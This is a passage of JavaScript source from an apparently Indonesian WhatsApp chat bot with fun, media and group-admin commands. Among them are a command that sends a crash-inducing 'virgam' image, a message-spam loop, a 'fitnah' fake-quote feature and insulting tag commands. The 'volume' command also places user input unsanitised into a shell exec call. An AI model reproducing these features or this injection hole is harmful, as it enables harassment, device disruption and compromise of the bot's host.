					ikyc.sendMessage(from, ''+sa+'\n\n_-BUCIN._', text, { quoted: iky })
					limitAdd(sender, limit)
					break
           
 case 'bisakah':
					bisakah = body.slice(1)
					const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😄','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 🙂','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					ikyc.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: iky })
					break

case 'kapankah':
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					ikyc.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: iky })
					break
case 'cekmati':
if(args.length == 1) return ikyc.reply(from, 'Format slah')
const randomUmur = Math.floor(Math.random() * 100)
const sendReplyMessage = `Nama : ${pushname}\nMati Pada Umur : ${randomUmur} Tahun.\n\n_Stop Coli Nanti Keburu Mati_`
ikyc.reply(from, sendReplyMessage, text, { quoted: fhidetag })
break
case 'howgay':
if(args.length == 1) return ikyc.reply(from, 'Format slah')
const randomUmurp = Math.floor(Math.random() * 100)
const sendReplyi = `Nama : ${pushname}\nInfo Gay : ${randomUmurp}%\n\n_50% - Gay Kalem 50% + Gay Parah_`
ikyc.reply(from, sendReplyi, text, { quoted: fhidetag })
break
case 'nomorhoki':
if (!q) return setReply(`Kirim perintah Berupa Nomor Untuk Melihat Kehokian Nomor Tsb`)
const randomHoki = Math.floor(Math.random() * 85)
const randomHokis = Math.floor(Math.random() * 10)
const randomHokil = Math.floor(Math.random() * 8)
const randomHokip = Math.floor(Math.random() * 5)
const randomHokio = Math.floor(Math.random() * 15)
const perselisihan = Math.floor(Math.random() * 2)
const kehilangan = Math.floor(Math.random() * 1)
const malapetaka = Math.floor(Math.random() * 100)
const kehancuran = Math.floor(Math.random() * 30)
const presentase = Math.floor(Math.random() * 35)
const sendReplyJembut = `Nomor : ${q}\n\nKehokian Terhadap Nomor Tersebut Adalah \n\n> 𝙀𝙉𝙀𝙍𝙂𝙄 𝙋𝙊𝙎𝙄𝙏𝙄𝙁 : Good\n> Kekayaan : ${randomHokis}%\n> Cinta : ${randomHokil}%\n> Kesehatan ${randomHokip}%\n> Kestabilan ${randomHokio}%\n> 𝙋𝙍𝙀𝙎𝙀𝙉𝙏𝘼𝙎𝙄 = ${randomHoki}%\n\n> 𝙀𝙉𝙀𝙍𝙂𝙄 𝙉𝙀𝙂𝘼𝙏𝙄𝙁 : Bad\n> Perselisihan : ${perselisihan}%\n> kehilangan : ${kehilangan}%\n> Malapetaka ${malapetaka}%\n> Kehancuran ${kehancuran}%\n> 𝙋𝙍𝙀𝙎𝙀𝙉𝙏𝘼𝙎𝙄 = ${presentase}%\n\n\n• 𝘾𝘼𝙏𝘼𝙏𝘼𝙉 : Suatu nomor dianggap baik jika persentase Energi Positif diatas 60%. Semakin besar persentase Energi Positif, semakin membawa hoki nomornya, dengan syarat persentase Angka Bagua Shuzi harus minimal 60%. Meskipun persentase Energi Positif besar, tetapi persentase Angka Bagua Shuzi kurang dari 60%, nomor tersebut kurang baik digunakan.`
ikyc.reply(from, sendReplyJembut, text, { quoted: fhidetag })
break
				
case 'apakah':
					apakah = body.slice(1)
					const apa =['iya dong jelas itu','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak ??','Haha mna mungkin 🤣']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					ikyc.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: iky })
					break
					
case 'bagaimanakah':
					bagaimanakah = body.slice(1)
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					ikyc.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: iky })
					break
					
case 'rate':
					rate = body.slice(1)
					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					ikyc.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: iky })
					break
case 'ngeselincek': case 'dajalcek': case 'butamapcek': case 'bebancek': case 'sampahcek': case 'gagunacek': case 'pintarcek': case 'bodohcek': case 'tololcek': case 'anakharamcek': case 'idiotcek': case 'goblokcek': case 'cantikcek': case 'gantengcek': case 'lesbicek': case 'gaycek': case 'gaycek':
if(args.length == 1) return ikyc.reply(from, 'Format slah')
const randomUmuw = Math.floor(Math.random() * 100)
const sendReplykiki = `NAMA : ${pushname}\n\nPertanyaan : ${command}\n\nJawaban : ${command} Kamu Adalah ${randomUmuw}%`
ikyc.reply(from, sendReplykiki, text, { quoted: fhidetag })
break					
case 'watak':
					watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					ikyc.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: iky })
					break
				
case 'hobby':
					hobby = body.slice(1)
					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					ikyc.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: iky })
					break                  
case 'ganteng': case 'ampas': case 'sultan': case 'sangean': case 'coli': case 'comel': case 'musuh': case 'penghianat': case 'jelek': case 'cantik': case 'lucu': case 'gemes': case 'imut': case 'miskin': case 'kaya': case 'kontol': case 'anjing': case 'beban': case 'babi':                	
				   if(!isGroup) return setReply("Hanya bisa di group") 
 				   jds = []
				   const A1 = groupMembers
  		 		const B1 = groupMembers
 				   const C1 = A1[Math.floor(Math.random() * A1.length)]
				   D1 = `𝙔𝘼𝙉𝙂 *ter${command}* 𝘿𝙄𝙎𝙄𝙉𝙄 𝘼𝘿𝘼𝙇𝘼𝙃 @${C1.jid.split('@')[0]}`                  
				   jds.push(C1.jid)
				   mentions(D1, jds, true)
				   break                             
       case 'tovirgam':
       case 'jadivirgam':
        if (!isOwner) return onlyOwner()

					if (!isQuotedSticker) return setReply('Reply stiker nya')
					if (iky.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await ikyc.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						setReply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await ikyc.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return setReply(mess.error.api)
							buffer = fs.readFileSync(ran)
							ikyc.sendMessage(from, buffer, image, {quoted: iky, thumbnail:virgam, caption: 'Nih Fotonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virgam/Bug SW!!'})
							fs.unlinkSync(ran)
						})
					}
					break
           
           
           
           case 'out':
           case 'leave':
				if (!isGroup) return 
				        if (!isOwner) return onlyOwner()
				    if (!isOwner && autosticker) return sendSticker(gaboleh)
				ikyc.groupLeave(from)
						break
						
						
						
						case 'reportbug':
						case 'bugreport':
						case 'laporbug':
						if(!q) return setReply(`Masukan laporan bug dengan teks atau reply gambar screenshot dengan teks\nLaporan yang main-main tidak akan di tanggapi`)
						if (isMedia && !iky.message.videoMessage || isQuotedImage) {
						if(!q) return setReply("Masukan laporan bug yang di alami")
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
							await ikyc.sendMessage(`6289699472590@s.whatsapp.net`, buff, image, { caption: `*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${q}\n\n\n                             ${calender}\n` })
							await ikyc.modifyChat(`6289699472590@s.whatsapp.net`, ChatModification.delete)
							await ikyc.sendMessage(from,"Laporan bug telah dikirim",text)
					    } else {
							await ikyc.sendMessage(`6289699472590@s.whatsapp.net`,`*「 Laporan Bug 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${q}\n\n\n                             ${calender}\n`,text)
						    await ikyc.modifyChat(`6289699472590@s.whatsapp.net`, ChatModification.delete)
						    await ikyc.sendMessage(from,"Laporan bug telah dikirim",text)
					        }
					       break
						
						case 'mausewa':
						if(!q) return setReply(`Masukan Sewaan Anda Contoh = Saya Mau Sewa Bot 7 Hari\nYang Main-Main Tidak Akan Di Tanggapi`)
						if (isMedia && !iky.message.videoMessage || isQuotedImage) {
						if(!q) return setReply("Masukan Orderan Yang Anda Ingin Sewa")
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
						buff = await ikyc.downloadMediaMessage(encmedia)
							await ikyc.sendMessage(`6289699472590@s.whatsapp.net`, buff, image, { caption: `*「 Order Sewa Bot 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nPenjelasan : \n\n${q}\n\n\n                             ${calender}\n` })
							await ikyc.modifyChat(`6289699472590@s.whatsapp.net`, ChatModification.delete)
							await ikyc.sendMessage(from,"Pesanan Anda Sedang Di Proses",text)
					    } else {
							await ikyc.sendMessage(`6289699472590@s.whatsapp.net`,`*「 Order Sewa Bot 」*\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nPenjelasan : \n\n${q}\n\n\n                             ${calender}\n`,text)
						    await ikyc.modifyChat(`6289699472590@s.whatsapp.net`, ChatModification.delete)
						    await ikyc.sendMessage(from,"Pesanan Anda Sedang Di Proses",text)
					        }
					       break
						
						
						
						
						
						case 'tts':	
						try{
						if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					if (args.length < 1) return setReply('Kode bahasanya mana kak?')
					if (args.length < 2) return setReply('Textnya mana kak?')
					const gtts = require('./lib/gtts')(args[0])
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					dtt.length > 600
					? setReply('Textnya kebanyakan kak')
					: gtts.save(ranm, dtt, function() {
						ikyc.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: iky, mimetype: 'audio/mp4', ptt:true})
						fs.unlinkSync(ranm)
					})   } catch (err){
						console.log(err)
            	setReply("Aduh gagal, coba lgi dong ^_^")
   
            }
					limitAdd(sender, limit)
					break
						
						
				
						
           
           
           
           
           
           



           
           
           
           
           
          
           
           
					
					
		case 'tourl3':
               if ((isMedia && !iky.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
               setReply(mess.wait)
               boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo : iky
               owgi = await ikyc.downloadMediaMessage(boij)
               res = await uploadFile1Day(owgi)
               setReply(res)
               } else {
               setReply('kirim/reply gambar/video')
}
               break
					
					
		
			 
					
					
					
case 'volume':
if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
if (!isQuotedAudio) return setReply('Reply audio!')
let encmedia3 = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media3 = await ikyc.downloadAndSaveMediaMessage(encmedia3)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media3)
if (err) return setReply('Error!')
jadie = fs.readFileSync(rname)
ikyc.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: setQuoted})
fs.unlinkSync(rname)
}
)
break
					
					
                 
                 
                 
           
           case 'ocr': 
				    if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
						const yamampun = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo : iky
						const media = await ikyc.downloadAndSaveMediaMessage(yamampun)
						setReply('wait')
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								setReply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								setReply(err)
								fs.unlinkSync(media)
							})
					} else {
						setReply(`kirim gambar bertulisan english dengan caption ${prefix + command}`)
					}
					break

           
           case 'clear':
               if (!isOwner) return onlyOwner()
                aw = ('succes delete this chat')
                console.log(color('[succes delete chat =]','gold')+ color('dari', 'cyan'), color(`${pushname}`, 'purple'))
                ikyc.modifyChat(from, ChatModification.delete)                
                break
           
           case 'delchat':
               if (!isOwner) return onlyOwner()
                aw = ('succes delete this chat')
                console.log(color('[succes delete chat =]','gold')+ color('dari', 'cyan'), color(`${pushname}`, 'purple'))
                ikyc.modifyChat(from, ChatModification.delete)
                setTimeout( () => {
                ikyc.sendMessage(from, aw, text)
                },3000)
                break
           
           case 'closetime': 
				if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
              if (args[1]=="detik") {var timer = args[0]*`1000`
				} else if (args[1]=="menit") {var timer = args[0]*`60000`
				} else if (args[1]=="jam") {var timer = args[0]*`3600000`
				} else if (args[1]=="hari") {var timer = args[0]*`86400000`
				} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				sendMess(`Close time ${q} dimulai dari sekarang`)
				setTimeout( () => {
					var nomor = iky.participant
					const close = {
					text: `*Tepat waktu* grup ditutup oleh admin  @${nomor.split("@s.whatsapp.net")[0]}\nsekarang hanya admin yang dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					ikyc.groupSettingChange (from, GroupSettingChange.messageSend, true);
					setReply(close)
				}, timer)
				break				
case 'opentime':        
			if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
               if (args[1]=="detik") {var timer = args[0]*`1000`
				} else if (args[1]=="menit") {var timer = args[0]*`60000`
				} else if (args[1]=="jam") {var timer = args[0]*`3600000`
				} else if (args[1]=="hari") {var timer = args[0]*`86400000`
				} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				sendMess(`Open time ${q} dimulai dari sekarang`)
				setTimeout( () => {
					var nomor = iky.participant
					const open = {
					text: `*Tepat waktu* grup dibuka oleh admin @${nomor.split("@s.whatsapp.net")[0]}\n sekarang member dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					ikyc.groupSettingChange (from, GroupSettingChange.messageSend, false);
					setReply(open)
				}, timer)
case 'leavetime':
if (!isGroup) return reply(mess.only.group)
if (!isOwner && !iky.key.fromMe) return sticOwner(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
ikyc.groupLeave(from);
}, timer)
break
				
				
				
case 'nuliskiri':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return setReply(`Kirim perintah *${prefix}nuliskiri* teks`)
                setReply(mess.wait)                
                const splitText = q.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './temp/nulis/images/buku/sebelumkiri.jpg',
                    '-font','./temp/nulis/font/Indie-Flower.ttf',
                    '-size','960x1280',
                    '-pointsize','22',
                    '-interline-spacing','2',
                    '-annotate','+140+153',
                    fixHeight,'./temp/nulis/images/buku/setelahkiri.jpg'
                ])
                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    ikyc.sendMessage(from, fs.readFileSync('./temp/nulis/images/buku/setelahkiri.jpg'), image, {quoted: iky, caption: `Nih...`})
                    limitAdd(sender, limit)
                })
            }
           break
                
                case 'nuliskanan':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return setReply(`Kirim perintah *${prefix}nuliskanan* teks`)
                setReply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './temp/nulis/images/buku/sebelumkanan.jpg',
                    '-font','./temp/nulis/font/Indie-Flower.ttf',
                     '-size', '960x1280',
                    '-pointsize','23',
                    '-interline-spacing','2',
                    '-annotate','+128+129',
                    fixHeight, './temp/nulis/images/buku/setelahkanan.jpg'
                ])
                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    ikyc.sendMessage(from, fs.readFileSync('./temp/nulis/images/buku/setelahkanan.jpg'), image, {quoted: iky, caption: `Nih...`})
                    limitAdd(sender, limit)
                })
            }
             break
            case 'foliokiri':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return setReply(`Kirim perintah *${prefix}foliokiri* teks`)
                setReply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 10).join('\n')
                spawn('convert', [
                    './temp/nulis/images/folio/sebelumkiri.jpg',
                    '-font',
'./temp/nulis/font/Indie-Flower.ttf',
                    '-size',
'3200x2180',
                     '-pointsize',
'55',
                     '-interline-spacing',
'2',
                     '-annotate',
'+80+390',
                    fixHeight,
'./temp/nulis/images/folio/setelahkiri.jpg'
                ])
                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    ikyc.sendMessage(from, fs.readFileSync('./temp/nulis/images/folio/setelahkiri.jpg'), image, {quoted: iky, caption: `Nih...`})
                    limitAdd(sender, limit)
                })
            }
                break
                
            case 'foliokanan':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!q) return setReply(`Kirim perintah *${prefix}foliokanan* teks`)
                setReply(mess.wait)
                const splitText = q.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 10).join('\n')
                spawn('convert', [
                    './temp/nulis/images/folio/sebelumkanan.jpg',
                    '-font',
'./temp/nulis/font/Indie-Flower.ttf',
                    '-size',
'3200x2180',
                    '-pointsize',
'55',
                    '-interline-spacing',
'2',
                    '-annotate',
'+130+400',
                    fixHeight,
'./temp/nulis/images/folio/setelahkanan.jpg'
                ])
                .on('error', () => setReply("Error Bjeer, Keknya Scriptnya Lagi Error"))
                .on('exit', () => {
                    ikyc.sendMessage(from, fs.readFileSync('./temp/nulis/images/folio/setelahkanan.jpg'), image, {quoted: iky, caption: `Nih...`})
                    limitAdd(sender, limit)
                })
            }
                break
                
                
                
                
                
                
                
                
                
                
                

       
            
          case 'getfp':
         case 'getpp':
				if (isGroup) { 
				if(q) return setReply("Jangan di tag")
				 if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) return setReply("Reply Targetnya")
				setReply(mess.wait)
			     kicknya = iky.message.extendedTextMessage.contextInfo.participant
			     try {
                 pic = await ikyc.getProfilePicture(kicknya)
                 } catch {
                pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                }
                onichan = await getBuffer(pic)
				ikyc.sendMessage(from, onichan, image, {quoted: setQuoted})
                } else {
                setReply(mess.wait)
                linkpp = await ikyc.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
                buffer = await getBuffer(linkpp)
               ikyc.sendMessage(from, buffer, image, {caption: "Nih", quoted: iky })
               }     
               break
            
            
            
               
            case 'getbio':
            if(isGroup){
         if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) return setReply("Reply Targetnya")
	  setReply(mess.wait)
	  var yy = iky.message.extendedTextMessage.contextInfo.participant
var p = await ikyc.getStatus(`${yy}`, MessageType.text)
setReply(p.status)
} else{
setReply(mess.wait)
var a = await ikyc.getStatus(from, MessageType.text)
setReply(a.status)
}
break
           
           
           
           
           


           
           

           
           
case 'tospam':
if (iky.message.extendedTextMessage === undefined || iky.message.extendedTextMessage === null) return setReply('Reply targetnya!')
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return setReply('Kebanyakan!')
if (!Number(oi2)) return setReply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  ikyc.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = iky.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return setReply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return setReply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  ikyc.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await ikyc.downloadAndSaveMediaMessage(encmedian)
				ara = fs.readFileSync(median)
	if (!Number(args[0])) return setReply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return setReply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  sendSticker(ara)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await ikyc.downloadAndSaveMediaMessage(encmediat)
				ara = fs.readFileSync(mediat)
	if (!Number(args[0])) return setReply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return setReply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  ikyc.sendMessage(from, ara, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo : iky
	delb = await ikyc.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return setReply('Kebanyakan!')
	if (!Number(oi2)) return setReply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  ikyc.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
           
           
           
           
           
           
           
           
           
           
           
    case 'delvote':
            if(!iky.key.remoteJid) return
            if(isVote) return setReply('Tidak ada sesi Voting')
            delVote(from)
            setReply('Sukses Menghapus sesi Voting Di Grup Ini')
            break
    case 'voting':
            if(!isGroupAdmins && !iky.key.fromMe) return 
            if(!isGroup) return setReply(mess.only.group)
            if(!q) return setReply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (isVote) return setReply('Sesi Voting Sedang Berlangsung Di Grup Ini')            
            if (iky.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || iky.message.extendedTextMessage.contextInfo == null) {
            let id = iky.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return setReply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `ketik vote untuk setuju \nketik devote untuk tidak setuju\n-Huruf kecil semua\n\nvote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
            
            

    
    
    
    
    
    
    
    case 'caripesan':
            if(!q)return setReply('pesannya apa bang?')
            let v = await ikyc.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            setReply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await ikyc.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            setReply('Pesan tidak ditemukan!')
            }           
            break
            


    

				
				
    
     




case 'darkjokes':
setReply(mess.wait)
try{
					data = fs.readFileSync('./lib/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					await ikyc.sendMessage(from, hasil, image, {quoted: setQuoted, caption: '*GELAP BOS :V*'})
					} catch (err){
						setReply(err)
						}
				break
    
    case 'afk':
            if (isAfkOn) return 
                reason = q ? q : 'Nothing'
                off.addAfkUser(sender, Date.now(), reason, _off)
               papa =  `*${pushname}* Sekarang sedang Afk\n*Reason :* ${reason}\n`
                ikyc.sendMessage(from,papa, text,{quoted : fhidetag})
            break
   
    case 'statuson':
            setReply(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${publik ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break   
    case 'get':
            if(!q) return setReply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            setReply(bu)
            })   
            break
case 'google':
              if (!q) return setReply('masukan teks')
              if(q == undefined || q == ' ') return setReply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
              ggs({ 'query': q }).then(results => {
              vars =``
              vars += `_*Hasil Pencarian : ${q}*_\n`
              for (let i = 0; i < results.length; i++) {
              vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
var lama = vars.trim()
               ikyc.sendMessage(from, lama, text, {quoted : iky })
               })
               break


					
					
					case 'setnamebot':
					case 'setbotname':
					if (!isOwner) return onlyOwner()
					setReply(`Berhasil mengubah nama bot ke ${q}`)
					fake = `${q}`
					break
					
					case 'forwardtotal':
					case 'totalforward':
					if (!isOwner) return onlyOwner()
					if(!q) return setReply(`Jumlah forwardnya berapa kak\ncontoh : 1, 100, 1000, 100000`)
					setReply(`Berhasil mengubah total forward ke ${q}`)
					totalForward = `${q}`
					break
					
					
					
					



			       
		     





                    
                


     





    case 'kontag':
        if(!q) return setReply(`penggunaan ${prefix}kontak nomor| nama`)
            if (!iky.key.fromMe && !isOwner && !isGroupAdmins) return setReply(mess.admin)
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return setReply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            ikyc.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    
    case 'fitnah':
    try{
    if(!isGroup) return setReply("Hanya bisa di group tod")
    if(!q) return setReply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
